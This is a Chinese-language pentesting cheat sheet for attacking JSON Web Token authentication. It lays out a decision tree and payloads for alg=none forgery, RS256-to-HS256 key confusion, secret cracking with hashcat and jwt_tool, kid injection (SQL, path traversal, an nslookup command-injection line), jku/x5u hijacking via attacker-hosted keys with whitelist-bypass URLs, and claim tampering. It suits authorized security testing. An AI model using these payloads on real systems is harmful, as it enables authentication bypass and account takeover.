# JWT 高阶决策卡 (Light Deep Card)

> **CWE**: 347 / 287 / 639 | **ROI**: 高 (P0/P1)
> **轻便原则**: 先看 Header/Payload 上下文,再决定攻击方式;不堆大字典。

---

## 0. First-pass Signal

1. 解码 JWT Header / Payload (不验证签名)。
2. 记录字段: `alg`, `kid`, `jku`, `x5u`, `jwk`, `typ`, `user_id`, `role`, `exp`, `iss`, `aud`。
3. 只根据字段触发对应分支,禁止盲试全部 payload。

```markdown
JWT_Context:
- alg: HS256 / RS256 / none / ...
- kid: yes/no
- jku/x5u/jwk: yes/no
- payload id fields: user_id / uid / sub / role
- exp/iss/aud: 是否校验异常
```

---

## 1. 决策树

| 信号 | 首测动作 | 命中判断 |
|------|----------|----------|
| `alg=none` 或服务端接受空签名 | 去签名请求低权限接口 | 200 / role 生效 |
| `alg=RS256` 且公钥可获取 | RS256→HS256 混淆 | 用公钥作 HMAC secret 签名后 200 |
| `alg=HS256` | 弱密钥爆破 | hashcat/jwt_tool 命中 secret |
| Header 有 `kid` | 测 SQLi / 路径遍历 / 命令注入 | 500/时间/OOB/secret 命中 |
| Header 有 `jku/x5u` | URL 白名单绕过 | 服务端取攻击者 JWKS 后验签成功 |
| Header 有内嵌 `jwk` | 替换为攻击者公钥 | 服务端信任 header jwk |
| Payload 有 `user_id/role` | 先绕签名再改 ID/role | 越权/BFLA 成功 |

---

## 2. 算法与签名类

### 2.1 none / 空签名

- Header 改 `{"alg":"none","typ":"JWT"}`。
- Signature 留空: `header.payload.`。
- 只请求低风险接口(如 `/api/me`),不要直接执行敏感操作。

### 2.2 RS256 → HS256 混淆

前提: 服务端使用 RS256,且公钥/JWKS 可获取。

```python
# 思路: 用公钥内容作为 HS256 secret 重新签名
jwt.encode(payload, public_key_pem, algorithm="HS256")
```

**注意**: 公钥格式差异会影响结果;尝试 PEM 原文、去头尾、DER base64 三种。

### 2.3 HS256 弱密钥

```bash
hashcat -m 16500 jwt.txt rockyou.txt --force
python jwt_tool.py <token> -C -d wordlist.txt
```

命中后只构造最小 PoC: `role=user→admin` 或 `sub=A→B`,再进入 BOLA/BFLA 验证。

---

## 3. `kid` 注入

| 类型 | Payload 思路 | 信号 |
|------|--------------|------|
| SQLi | `kid="1' UNION SELECT 'secret'--"` | 500 / 登录成功 / 时间差 |
| 路径遍历 | `kid="../../../../dev/null"` 或 `../../key.pem` | 错误变化 / 验签异常变化 |
| 命令注入 | `kid="key; nslookup x.oob"` | OOB 回调 |
| 文件包含 | `kid="file:///tmp/key"` | 错误差异 |

**禁止**: kid 命令注入直接执行破坏性命令;先 OOB-only。

---

## 4. `jku` / `x5u` / `jwk`

### 4.1 jku/x5u 劫持

1. 自建 JWKS,放攻击者公钥。
2. Header 改 `jku` / `x5u` 指向攻击者域。
3. 用对应私钥签名。
4. 若服务端未做域名白名单,会验签成功。

**白名单绕过点**: `https://trusted.com.evil.com/jwks`, `https://evil.com@trusted.com/`, 302 跳转, DNS rebinding。

### 4.2 header `jwk`

若服务端信任 JWT Header 中的内嵌 JWK,直接把攻击者公钥写入 `jwk`,用私钥签名。

---

## 5. Claims 逻辑

| 字段 | 测试 | 影响 |
|------|------|------|
| `sub/user_id/uid` | A token 改 B id | BOLA |
| `role/is_admin` | user→admin | BFLA |
| `exp` | 过期 token 是否仍可用 | 会话失效问题 |
| `iss/aud` | 改 issuer/audience | 多租户绕过 |
| `tenant/org_id` | A 租户 token 改 B 租户 | 租户越权 |

---

## 6. Triage

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| 改 payload 后 401 | 签名校验正常 | 回到签名绕过分支 |
| none 不生效 | 框架已修 | 不继续死磕,看 kid/jku |
| HS256 爆破失败 | 密钥强 | 查 JS/配置/泄露信息 |
| jku 请求无 OOB | 服务端未取远程 JWKS / 出站封锁 | 看错误信息/换 HTTP OOB |
| role 改了但权限不变 | 后端不用 JWT role 授权 | 改 user_id/sub 测 BOLA |

---

## 7. 级联

- 发现 `user_id/sub` → 进入 BOLA: [../payload-construction/bola-construction.md](../payload-construction/bola-construction.md)
- 发现弱 secret / 公钥泄露 → 进入敏感信息三阶段验证
- 发现 `kid` SQLi → 进入 SQLi 决策卡: [sqli.md](sqli.md)
- 发现 jku/x5u SSRF 行为 → 进入 SSRF: [ssrf.md](ssrf.md)

---

## 8. 相关参考

- JWT 构造思路 → [../payload-construction/jwt-construction.md](../payload-construction/jwt-construction.md)
- API 安全 / BOLA / BFLA → [../api-security.md](../api-security.md)
- 级联策略 → [../chained-logic-extended.md](../chained-logic-extended.md)
